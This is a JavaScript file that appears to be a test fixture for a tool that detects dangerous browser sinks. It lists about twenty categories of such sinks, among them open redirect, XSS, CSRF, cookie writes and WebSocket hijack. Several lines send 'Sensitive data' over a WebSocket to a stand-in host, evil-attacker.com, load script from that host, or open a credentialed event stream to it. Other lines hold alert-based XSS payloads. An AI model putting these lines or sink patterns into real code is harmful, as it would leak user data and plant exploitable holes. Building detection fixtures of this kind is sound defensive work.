// 1. Open Redirect
function openRedirect() {
    // Variation 1
    const url = 'https://example.com';
    window.location.href = url;
  
    // Variation 2
    const relativeURL = '/redirect?url=https://example.com';
    location.assign(relativeURL);

    document.location.replace(relativeURL);
  
    // Variation 3
    const searchParams = new URLSearchParams();
    searchParams.append('url', 'https://example.com');
    document.location.search = searchParams.toString();
  
    // Variation 4
    const hash = '#redirect=https://example.com';
    window.location.hash = hash;

    const path = 'a/b/c';
    location.path = path;

    $(location).prop('href', hash);

    var b = "google.com";
    window.location = b;

    var c = "facebook.com";
    location = c;


    var d = c;
    document.location.href.assign(d);

    location.href.assign(b);

    function somesource(){
      return 'google.com';
    }

    $(window.location).prop('href', somesource());

    $(location).attr('href', b);

  }
  
  // 2. WebSocket URL poisoning
  function hijackWebSocket() {
    // Variation 1
    const wsURL = 'wss://evil-attacker.com';
    const wsProtocols = ['protocol1', 'protocol2'];
    const socket = new WebSocket(wsURL, wsProtocols);
    socket.send('Sensitive data');
  
    // Variation 2
    const wsRelativeURL = 'ws/evil-attacker';
    const wsRelative = new WebSocket(wsRelativeURL);
    wsRelative.send('Sensitive data');
  }
  
  // 3. Link Manipulation
  function manipulateLink() {
    // Variation 1
    const elementId = 'myElement';
    const newSrc = 'https://evil-attacker.com/malicious.js';
    const someElement = document.getElementById(elementId);
    someElement.src = newSrc;
  
    // Variation 2
    const imageElement = document.createElement('img');
    imageElement.src.assign('https://evil-attacker.com/malicious.png');
  
    // Variation 3
    const anchorElement = document.createElement('a');
    anchorElement.setAttribute('href', 'https://evil-attacker.com');
  }
  
  // 4. Cookie Manipulation
  function manipulateCookie() {
    // Variation 1
    const cookieValue = 'user=admin; path=/';
    document.cookie = cookieValue;
  
    // Variation 2
    CookieStore.delete('session');
  
    // Variation 3
    const sessionCookie = CookieStore.get('session');
    console.log(sessionCookie);
  
    // Variation 4
    const allCookies = CookieStore.getAll();
    console.log(allCookies);
  
    // Variation 5
    CookieStore.set('session', '123456');
  }
  
  // 5. WebStorage Manipulation
  function manipulateWebStorage() {
    // Variation 1
    const localStorageKey = 'user';
    const localStorageValue = 'admin';
    localStorage.setItem(localStorageKey, localStorageValue);
    const localStorageItem = localStorage.getItem(localStorageKey);
    console.log(localStorageItem);
  
    // Variation 2
    const sessionStorageKey = 'token';
    const sessionStorageValue = 'abcd1234';
    sessionStorage.setItem(sessionStorageKey, sessionStorageValue);
    const sessionStorageItem = sessionStorage.getItem(sessionStorageKey);
    console.log(sessionStorageItem);
  }
  
  // 6. Document Domain Manipulation
  function manipulateDocumentDomain() {
    // Variation 1
    const newDomain = 'evil-attacker.com';
    document.domain = newDomain;
  
    // Variation 2
    const domainFromInput = document.getElementById('domainInput').value;
    document.domain.assign(domainFromInput);
  }
  
  // 7. Client-side JSON injection
  function parseJSON() {
    // Variation 1
    const jsonString = '{"user": "admin", "role": "admin"}';
    const parsedJSON = JSON.parse(jsonString);
    console.log(parsedJSON);
  
    // Variation 2
    const jsonFromInput = document.getElementById('jsonInput').value;
    const parsedJSONFromInput = jQuery.parseJSON(jsonFromInput);
    console.log(parsedJSONFromInput);

        // Variation 2
    const jsonFromInput2 = document.getElementById('jsonInput').value;
    const parsedJSONFromInput2 = $.parseJSON(jsonFromInput2);
    console.log(parsedJSONFromInput2);
  }
  
  // 8. ReDos - Regex Denial of Service
  function regexDoS() {
    // Variation 1
    const regexPattern = /^([a-z]+)+$/;
    const regex = new RegExp(regexPattern);
  }
  
  // 9. Web-message Manipulation
  function manipulateWebMessage() {
    // Variation 1
    const message = 'Hello, World!';
    const targetOrigin = 'https://example.com';
    window.postMessage(message, targetOrigin);
  
    // Variation 2
    const messageFromInput = document.getElementById('messageInput').value;
    const targetOriginFromInput = document.getElementById('targetOriginInput').value;
    postMessage(messageFromInput, targetOriginFromInput);
  }
  
  // 10. Client-side CSRF
  // URL poisoning
  function csrfURLPoisoning() {
    // Variation 1
    const requestURL = 'https://api.example.com/updateProfile';
    const requestData = { username: 'admin', role: 'admin' };
  
    const xhr = new XMLHttpRequest();
    xhr.open('POST', requestURL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(requestData));
  
    // Variation 2
    jQuery.ajax({ url: requestURL, method: 'POST', data: requestData });
  
    // Variation 3
    $.ajax({ url: requestURL, method: 'POST', data: requestData });
  
    // Variation 4
    fetch(requestURL, { method: 'POST', body: JSON.stringify(requestData) });
    fetch(url = requestURL, { method: 'POST', body: JSON.stringify(requestData) });
  
    // Variation 5
    AsyncRequest(requestURL);
  
    // Variation 6
    asyncRequest(requestURL);
  
    // Variation 7
    const win = window.open(requestURL);
  
    // Variation 8
    const newTabURL = 'https://api.example.com/transferFunds';
    const winNewTab = window.open(newTabURL);
  }
  
  // Header poisoning
  function csrfHeaderPoisoning() {
    // Variation 1
    const requestURL = 'https://api.example.com/submitOrder';
    const authToken = 'abcd1234';
  
    const xhr = new XMLHttpRequest();
    xhr.open('POST', requestURL, true);
    xhr.setRequestHeader('Authorization', authToken);
    xhr.send();
  
    // Variation 2
    const xhrWithHeaders = new XMLHttpRequest();
    xhrWithHeaders.open('POST', requestURL, true);
    xhrWithHeaders.setRequestHeader('Content-Type', 'application/json');
    xhrWithHeaders.setRequestHeader('Authorization', authToken);
    xhrWithHeaders.send();
  }
  
  // Body poisoning
  function csrfBodyPoisoning() {
    // Variation 1
    const requestURL = 'https://api.example.com/submitForm';
    const formData = new FormData();
    formData.append('name', 'John');
    formData.append('email', 'john@example.com');
  
    jQuery.ajax({ url: requestURL, method: 'POST', data: formData });
  
    // Variation 2
    const requestBody = { name: 'John', email: 'john@example.com' };
    $.ajax({ url: requestURL, method: 'POST', data: requestBody });
  
    // Variation 3
    const fetchOptions = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(requestBody)
    };
    fetch(requestURL, fetchOptions);
  }
  
// 11. Client-side XSS
function clientSideXSS() {
    // Variation 1
    const elementId = 'myElement';
    const xssPayload = '<img src="xss.jpg" onerror="alert(\'XSS\')">';
  
    const someElement = document.getElementById(elementId);
    someElement.innerHTML = xssPayload;
  
    // Variation 2
    const outerElementId = 'outerElement';
    const outerXSSPayload = '<div><script>alert(\'XSS\')</script></div>';
  
    const outerElement = document.getElementById(outerElementId);
    outerElement.outerHTML = outerXSSPayload;
  
    // Variation 3
    const insertElementId = 'insertElement';
    const insertXSSPayload = '<script>alert(\'XSS\')</script>';
  
    const insertElement = document.getElementById(insertElementId);
    insertElement.insertAdjacentHTML('beforeend', insertXSSPayload);
  
    // Variation 4
    const evalPayload = 'alert(\'XSS\');';
    eval(evalPayload);
  
    // Variation 5
    const writePayload = '<script>alert(\'XSS\')</script>';
    document.write(writePayload);
  
    // Variation 6
    const writeLnPayload = '<script>alert(\'XSS\')</script>';
    document.writeln(writeLnPayload);
  
    // Variation 7
    const parseHTMLPayload = '<div><script>alert(\'XSS\')</script></div>';
    jQuery.parseHTML(parseHTMLPayload);
  
    // Variation 8
    const parseHTMLPayload2 = '<div><script>alert(\'XSS\')</script></div>';
    $.parseHTML(parseHTMLPayload2);
  
    // Variation 9
    const htmlPayload = '<script>alert(\'XSS\')</script>';
    $(elementId).html(htmlPayload);
  
    // Variation 10
    const appendPayload = '<script>alert(\'XSS\')</script>';
    $(elementId).append(appendPayload);
  
    // Variation 11
    const setTimeoutPayload = 'alert(\'XSS\');';
    setTimeout(setTimeoutPayload, 2000);
  
    // Variation 12
    const setIntervalPayload = 'alert(\'XSS\');';
    setInterval(setIntervalPayload, 5000);
  }
  
  // 12. Local File Read Path Manipulation
  function localFileReadPathManipulation() {
    // Variation 1
    const fileReader1 = new FileReader();
    fileReader1.readAsText(TAINT);
    fileReader1.readAsArrayBuffer(TAINT);
    fileReader1.readAsBinaryString(TAINT);
    fileReader1.readAsDataURL(TAINT);
  
    // Variation 2
    const fileReader2 = new FileReader();
    fileReader2.readAsText(fileInput.files[0]);
    fileReader2.readAsArrayBuffer(fileInput.files[0]);
    fileReader2.readAsBinaryString(fileInput.files[0]);
    fileReader2.readAsDataURL(fileInput.files[0]);

    // variation 3
    new FileReader().readAsText('something');
  }
  
  // 13. SSE URL/connection hijack
  function sseURLConnectionHijack() {
    // Variation 1
    const sseURL = 'https://evil-attacker.com/eventStream';
    const sseConfig = { withCredentials: true };
    const eventSource = new EventSource(sseURL, sseConfig);
  
    // Variation 2
    const webTransportURL = 'https://evil-attacker.com/webTransport';
    const webTransport = new WebTransport(webTransportURL);
  }
  
  // 14. CacheStorage
  function cacheStorage() {
    // Variation 1
    caches.match(TAINT);
  
    // Variation 2
    caches.has(TAINT);
  
    // Variation 3
    caches.open(TAINT);
  
    // Variation 4
    caches.delete(TAINT);
  }
  
  // 15. Selectors as sink
  function selectorsAsSink() {
    TAINT = "";
    // Variation 1
    const elementId = TAINT;
    document.getElementById(elementId);
  
    // Variation 2
    const className = TAINT;
    document.getElementsByClassName(className);
  
    // Variation 3
    const tagName = TAINT;
    document.getElementsByTagName(tagName);
  
    // Variation 4
    const selector = TAINT;
    document.querySelector(selector);
  
    // Variation 5
    const selectorAll = TAINT;
    document.querySelectorAll(selectorAll);
  
    // Variation 6
    const jQuerySelector = TAINT;
    jQuery(jQuerySelector);
  
    // Variation 7
    const jQuerySelector2 = TAINT;
    $(jQuerySelector2);
  }
  
//   // 16. Assignment of sinks to variables
//   function assignmentOfSinks() {
//     // Variation 1
//     const assignFunction = window.location.assign;
//     const assignTaint = assignFunction(TAINT);
  
//     // Variation 2
//     const variable = window.location;
//     const assignTaint2 = variable.assign(TAINT);
//   }
  
  // 17. SW backgroundFetch
  function swBackgroundFetch() {
    // Variation 1
    const fetchId = 'backgroundFetchId';
    const fetchList = ['https://api.example.com/data1', 'https://api.example.com/data2'];
    const fetchOptions = { title: 'Background Fetch' };
  
    backgroundFetch.fetch(fetchId, fetchList, fetchOptions);
  }
  
  // 18. Analytical data
  function analyticalData() {
    // Variation 1
    const analyticsURL = 'https://analytics.example.com/log';
    const analyticsData = { event: 'click', target: 'button' };
  
    navigator.sendBeacon(analyticsURL, analyticsData);
  }
  
// 19. Credential Management API
function credentialManagementAPI() {
    // Variation 2
    const credentialData = { id: 'user123', password: 'password123' };
    const credentialObj = new FederatedCredential(credentialData);
  
    // Variation 3
    const credentialObj2 = new PasswordCredential({ id: 'user456', password: 'pass456' });
  
    // Variation 4
    const storeData = { id: 'user789', password: 'pass789' };
    navigator.credentials.store(storeData);
  
    // Variation 5
    const getCredentialData = { password: true };
    const getCredential = navigator.credentials.get(getCredentialData);
  }
  
  // 20. Event Listener hijacking
  function eventListenerHijacking() {
    // Variation 1
    const taintableElement = document.getElementById('taintableElement');
    taintableElement.addEventListener('click', function () {
      // Function call with taint
    });
  
    // Variation 2
    const event = new Event('click');
    taintableElement.dispatchEvent(event);
  }
  
  


  // Call the functions to trigger the sinks
  openRedirect();
  hijackWebSocket();
  manipulateLink();
  manipulateCookie();
  manipulateWebStorage();
  manipulateDocumentDomain();
  parseJSON();
  regexDoS();
  manipulateWebMessage();
  csrfURLPoisoning();
  csrfHeaderPoisoning();
  csrfBodyPoisoning();
  clientSideXSS();
  localFileReadPathManipulation();
  sseURLConnectionHijack();
  cacheStorage();
  selectorsAsSink();
  assignmentOfSinks();
  swBackgroundFetch();
  analyticalData();
  credentialManagementAPI();
  eventListenerHijacking();